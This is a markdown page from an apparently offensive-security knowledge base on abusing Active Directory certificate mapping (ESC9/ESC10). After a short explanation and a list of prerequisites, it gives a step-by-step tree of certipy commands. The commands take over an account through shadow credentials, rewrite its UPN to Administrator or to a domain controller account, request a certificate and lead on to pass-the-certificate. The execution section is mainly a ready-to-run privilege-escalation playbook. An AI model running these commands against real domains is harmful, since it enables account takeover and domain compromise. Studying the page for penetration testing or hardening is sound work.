# Certificate Mapping Abuse (esc9, esc10)

ESC9 and ESC10 exploit how a certificate is tied back to an account. By altering a UPN or relying on weak mapping configuration, a certificate issued for one account can be made to authenticate as another — including a privileged one.

## Why It Works

Certificate mapping resolves a presented certificate to a directory account. When that mapping is implicit or based on a mutable attribute like UPN, an attacker who can change the attribute controls which account the certificate authenticates as.

## Prerequisites

* Write access to the UPN or mapping attribute of a controlled account
* Enrollment rights on a suitable template

## Execution

**Abuse Certificate Mapping**

* ESC9/ESC10 (implicit)
  * `certipy shadow auto -username <accountA>@<domain> -p <passA> -account <accountB>` [\[tool\]](https://github.com/ly4k/Certipy)
    * ESC9/ESC10 (Case 1)
      * `certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn Administrator` [\[tool\]](https://github.com/ly4k/Certipy)
        * ESC9
          * `certipy req -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template <vulnerable template>` [\[tool\]](https://github.com/ly4k/Certipy)
        * ESC10 (case 1)
          * `certipy req -username <accountB>@<domain> -hashes <hashB> -ca <ca_name> -template <any template with client auth>` [\[tool\]](https://github.com/ly4k/Certipy)
            * **→ reset accountB UPN**
    * ESC10 (Case 2)
      * `certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn '<dc_name$>@<domain>'` [\[tool\]](https://github.com/ly4k/Certipy)
        * **→ ESC10 Case1**
  * reset accountB UPN
    * `certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn <accountB>@<domain>` [\[tool\]](https://github.com/ly4k/Certipy)
      * \[Kerberos Mapping] ESC9/ESC10(Case 1)
      * \[Schannel Mapping] ESC9/ESC10 (Case 2)
        * **→ Pass The Certificate**
* ESC14 (explicit)

## Related

* [Misconfigured Templates (ESC1–ESC4)](file:///9685693/adcs/misconfigured-templates-esc1-esc4.md) — obtaining the certificate to map
* [Rights on Users & Groups](file:///9685693/acl-abuse/rights-on-users-and-groups.md) — the write access that enables it
